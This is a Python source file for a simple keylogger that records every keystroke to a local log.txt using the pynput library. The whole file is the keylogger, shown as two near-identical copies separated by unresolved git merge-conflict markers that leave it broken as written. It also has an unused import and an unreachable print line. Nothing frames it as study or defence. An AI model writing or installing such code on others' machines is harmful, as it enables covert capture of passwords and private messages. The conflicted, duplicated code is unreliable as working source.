# Import the necessary modules
import pyautogui
from pynput import keyboard

<<<<<<< HEAD
# Define a function to write the pressed key to a file
def on_press(key):
    try:
        # If the key is a normal character, write it to the file
        current_key = str(key.char)
    except AttributeError:
        # If the key is a special key, write it to the file with spaces around it
        if key == keyboard.Key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    with open('log.txt', 'a') as f:
        f.write(current_key)

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

print("press enter to quit...")

=======
# Define a function to write the pressed key to a file
def on_press(key):
    try:
        # If the key is a normal character, write it to the file
        current_key = str(key.char)
    except AttributeError:
        # If the key is a special key, write it to the file with spaces around it
        if key == keyboard.Key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "
    with open('log.txt', 'a') as f:
        f.write(current_key)

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

>>>>>>> 781fe6989a5410d0fa5f94b2328a15e005efd620